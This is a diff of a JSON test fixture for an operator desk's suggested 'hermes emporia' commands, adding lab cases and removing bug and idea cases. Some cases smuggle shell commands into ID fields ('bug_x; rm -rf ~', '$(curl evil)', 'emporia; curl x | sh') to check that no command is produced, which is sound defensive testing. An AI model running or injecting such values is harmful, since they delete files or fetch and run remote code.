@@ -2,117 +2,6 @@
  "about": "The commands the operator's desk suggests. emporia/operator_desk.py and dashboard/src/operatorCommands.ts both reproduce this table (tests/test_operator.py, dashboard/src/operatorCommands.test.ts).",
  "cases": [
   {
-   "kind": "bug",
-   "name": "opdesk",
-   "item": {
-    "report_id": "bug_0123456789abcdef",
-    "severity_claimed": "high"
-   },
-   "expect": [
-    {
-     "label": "accept, severity high",
-     "command": "hermes emporia bugs opdesk verdict bug_0123456789abcdef accepted --severity high --fix FIX_COMMIT",
-     "gate": "person"
-    },
-    {
-     "label": "a duplicate",
-     "command": "hermes emporia bugs opdesk verdict bug_0123456789abcdef duplicate --of EARLIER_REPORT",
-     "gate": "person"
-    },
-    {
-     "label": "invalid",
-     "command": "hermes emporia bugs opdesk verdict bug_0123456789abcdef invalid",
-     "gate": "person"
-    }
-   ]
-  },
-  {
-   "kind": "bug",
-   "name": "opdesk",
-   "item": {
-    "report_id": "bug_aa",
-    "severity_claimed": "made-up"
-   },
-   "expect": [
-    {
-     "label": "accept, severity SEVERITY",
-     "command": "hermes emporia bugs opdesk verdict bug_aa accepted --severity SEVERITY --fix FIX_COMMIT",
-     "gate": "person"
-    },
-    {
-     "label": "a duplicate",
-     "command": "hermes emporia bugs opdesk verdict bug_aa duplicate --of EARLIER_REPORT",
-     "gate": "person"
-    },
-    {
-     "label": "invalid",
-     "command": "hermes emporia bugs opdesk verdict bug_aa invalid",
-     "gate": "person"
-    }
-   ]
-  },
-  {
-   "kind": "bug",
-   "name": "opdesk",
-   "item": {
-    "report_id": "bug_x; rm -rf ~",
-    "severity_claimed": "low"
-   },
-   "expect": []
-  },
-  {
-   "kind": "bug",
-   "name": "Not A Name",
-   "item": {
-    "report_id": "bug_aa",
-    "severity_claimed": "low"
-   },
-   "expect": []
-  },
-  {
-   "kind": "idea",
-   "name": "opdesk",
-   "verdicts": true,
-   "item": {
-    "post_id": "pst_0123456789ab"
-   },
-   "expect": [
-    {
-     "label": "adopt",
-     "command": "hermes emporia ideas opdesk adopt pst_0123456789ab --ref COMMIT_OR_ROADMAP_ITEM",
-     "gate": "person"
-    },
-    {
-     "label": "noted",
-     "command": "hermes emporia ideas opdesk noted pst_0123456789ab",
-     "gate": "person"
-    },
-    {
-     "label": "a duplicate",
-     "command": "hermes emporia ideas opdesk duplicate pst_0123456789ab --of EARLIER_POST",
-     "gate": "person"
-    }
-   ]
-  },
-  {
-   "kind": "idea",
-   "name": "opdesk",
-   "verdicts": false,
-   "item": {
-    "post_id": "pst_0123456789ab"
-   },
-   "expect": []
-  },
-  {
-   "kind": "idea",
-   "name": "opdesk",
-   "verdicts": true,
-   "item": {
-    "post_id": "$(curl evil)"
-   },
-   "expect": []
-  },
-  {
    "kind": "expedition",
    "name": "opdesk",
    "expect": [
@@ -190,33 +79,30 @@
    ]
   },
   {
-   "kind": "bug",
-   "name": "NAME",
+   "kind": "snapshot",
+   "name": "Name",
+   "expect": []
+  },
+  {
+   "kind": "lab",
+   "name": "opdesk",
    "item": {
-    "report_id": "bug_aa",
-    "severity_claimed": "low"
+    "lab": "emporia"
    },
    "expect": [
     {
-     "label": "accept, severity low",
-     "command": "hermes emporia bugs NAME verdict bug_aa accepted --severity low --fix FIX_COMMIT",
-     "gate": "person"
-    },
-    {
-     "label": "a duplicate",
-     "command": "hermes emporia bugs NAME verdict bug_aa duplicate --of EARLIER_REPORT",
-     "gate": "person"
-    },
-    {
-     "label": "invalid",
-     "command": "hermes emporia bugs NAME verdict bug_aa invalid",
-     "gate": "person"
+     "label": "read the lab's threads",
+     "command": "hermes emporia lab opdesk show emporia",
+     "gate": "read"
     }
    ]
   },
   {
-   "kind": "snapshot",
-   "name": "Name",
+   "kind": "lab",
+   "name": "opdesk",
+   "item": {
+    "lab": "emporia; curl x | sh"
+   },
    "expect": []
   }
  ]
